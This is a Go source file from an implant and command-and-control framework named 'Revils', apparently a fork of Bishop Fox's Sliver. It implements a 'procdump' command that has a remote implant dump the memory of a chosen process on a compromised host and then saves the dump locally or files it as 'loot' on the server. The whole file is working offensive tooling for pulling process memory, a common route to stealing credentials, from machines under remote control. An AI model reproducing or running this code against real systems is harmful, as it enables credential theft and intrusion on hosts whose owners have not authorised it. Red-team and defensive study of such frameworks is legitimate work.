package processes

/*
	Revils Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"time"

	"github.com/Kevin-kitnick/revils/client/command/loot"
	"github.com/Kevin-kitnick/revils/client/console"
	"github.com/Kevin-kitnick/revils/protobuf/clientpb"
	"github.com/Kevin-kitnick/revils/protobuf/revilspb"
	"github.com/desertbit/grumble"
	"google.golang.org/protobuf/proto"
)

// ProcdumpCmd - Dump the memory of a remote process
func ProcdumpCmd(ctx *grumble.Context, con *console.RevilsConsoleClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	pid := ctx.Flags.Int("pid")
	name := ctx.Flags.String("name")
	saveTo := ctx.Flags.String("save")
	saveLoot := ctx.Flags.Bool("loot")
	lootName := ctx.Flags.String("loot-name")

	if pid == -1 && name != "" {
		pid = GetPIDByName(ctx, name, con)
	}
	if pid == -1 {
		con.PrintErrorf("Invalid process target\n")
		return
	}

	if ctx.Flags.Int("timeout") < 1 {
		con.PrintErrorf("Invalid timeout argument\n")
		return
	}

	ctrl := make(chan bool)
	con.SpinUntil("Dumping remote process memory ...", ctrl)
	dump, err := con.Rpc.ProcessDump(context.Background(), &revilspb.ProcessDumpReq{
		Request: con.ActiveTarget.Request(ctx),
		Pid:     int32(pid),
		Timeout: int32(ctx.Flags.Int("timeout") - 1),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	hostname := getHostname(session, beacon)
	if dump.Response != nil && dump.Response.Async {
		con.AddBeaconCallback(dump.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, dump)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			if saveLoot {
				LootProcessDump(dump, lootName, hostname, pid, con)
			}

			if !saveLoot || saveTo != "" {
				PrintProcessDump(dump, saveTo, hostname, pid, con)
			}
		})
		con.PrintAsyncResponse(dump.Response)
	} else {
		if saveLoot {
			LootProcessDump(dump, lootName, hostname, pid, con)
		}

		if !saveLoot || saveTo != "" {
			PrintProcessDump(dump, saveTo, hostname, pid, con)
		}
	}

}

// PrintProcessDump - Handle the results of a process dump
func PrintProcessDump(dump *revilspb.ProcessDump, saveTo string, hostname string, pid int, con *console.RevilsConsoleClient) {
	var err error
	var saveToFile *os.File
	if saveTo == "" {
		tmpFileName := filepath.Base(fmt.Sprintf("procdump_%s_%d_*", hostname, pid))
		saveToFile, err = ioutil.TempFile("", tmpFileName)
		if err != nil {
			con.PrintErrorf("Error creating temporary file: %s\n", err)
			return
		}
	} else {
		saveToFile, err = os.OpenFile(saveTo, os.O_WRONLY|os.O_CREATE, 0o600)
		if err != nil {
			con.PrintErrorf("Error creating file: %s\n", err)
			return
		}
	}
	defer saveToFile.Close()
	saveToFile.Write(dump.GetData())
	con.PrintInfof("Process dump stored in: %s\n", saveToFile.Name())
}

func getHostname(session *clientpb.Session, beacon *clientpb.Beacon) string {
	if session != nil {
		return session.Hostname
	}
	if beacon != nil {
		return beacon.Hostname
	}
	return ""
}

func LootProcessDump(dump *revilspb.ProcessDump, lootName string, hostName string, pid int, con *console.RevilsConsoleClient) {
	timeNow := time.Now().UTC()
	dumpFileName := fmt.Sprintf("procdump_%s_%d_%s.dmp", hostName, pid, timeNow.Format("20060102150405"))

	if lootName == "" {
		lootName = dumpFileName
	}

	lootMessage := loot.CreateLootMessage(dumpFileName, lootName, clientpb.LootType_LOOT_FILE, clientpb.FileType_BINARY, dump.GetData())
	loot.SendLootMessage(lootMessage, con)
}
